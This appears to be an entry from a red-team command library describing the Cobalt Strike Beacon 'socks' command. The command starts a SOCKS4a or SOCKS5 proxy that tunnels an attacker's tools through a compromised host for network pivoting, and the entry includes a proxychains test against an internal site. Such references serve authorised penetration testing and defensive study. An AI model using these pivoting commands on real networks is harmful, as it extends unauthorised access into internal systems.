---
id: eb95573f-a11e-4cfc-96d7-c35ea2bfcc3d
name: cobalt-strike-start-socks-server
type: command
executor: bash
data: beacon > socks $_PORT
output: null
created_at: '2023-04-06T03:56:16.576262+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
  - Linux
tags:
  - pivoting
  - proxy
verified: true
validated: true
---

# cobalt-strike-start-socks-server

## Command

```bash
beacon > socks $_PORT
```

## Description

Starts a SOCKS4a proxy server on the specified port on the Cobalt Strike team server, tunneling all traffic through the active Beacon session. This enables VPN-like pivoting for external tools. For SOCKS5 or authentication, use advanced variations.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_PORT | Local port to bind the SOCKS server (e.g., 1080) | Yes |

## Examples

### Basic Usage

```bash
beacon > socks 1080
```

### Advanced Usage (SOCKS5 with Auth)

In Beacon console: `socks 1080 socks5 disableNoAuth user password enableLogging` (variations not as separate commands; execute directly in console).

## Expected Output

Beacon console shows: "[*] SOCKS server started (port $_PORT)". Team server logs confirm active proxy; test with `proxychains curl internal.site` from attacker machine.

## Related

- [[procedures/Establish-VPN-Like-Connection-and-Pivot-Using-Cobalt-Strike]]
- [[tools/Cobalt-Strike]]
